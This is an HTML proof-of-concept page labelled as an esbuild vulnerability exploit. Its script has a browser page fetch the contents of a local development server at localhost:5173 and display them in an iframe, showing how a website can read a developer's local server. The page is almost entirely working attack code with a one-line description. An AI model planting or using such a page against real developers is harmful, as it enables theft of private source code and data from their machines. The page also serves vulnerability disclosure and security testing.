<!DOCTYPE html>
<html>
<head>
  <title>esbuild Vulnerability POC</title>
</head>
<body>
  <h1>esbuild Vulnerability POC</h1>
  <p>This page attempts to exploit the esbuild vulnerability to fetch data from the development server.</p>
  <iframe id="output" style="width: 100%; height: 500px;"></iframe>
  <script>
    const iframe = document.getElementById('output');
    const url = 'http://localhost:5173/';

    fetch(url)
      .then(response => response.text())
      .then(data => {
        iframe.srcdoc = data;
      })
      .catch(error => {
        iframe.srcdoc = `Error: ${error}`;
      });
  </script>
</body>
</html>
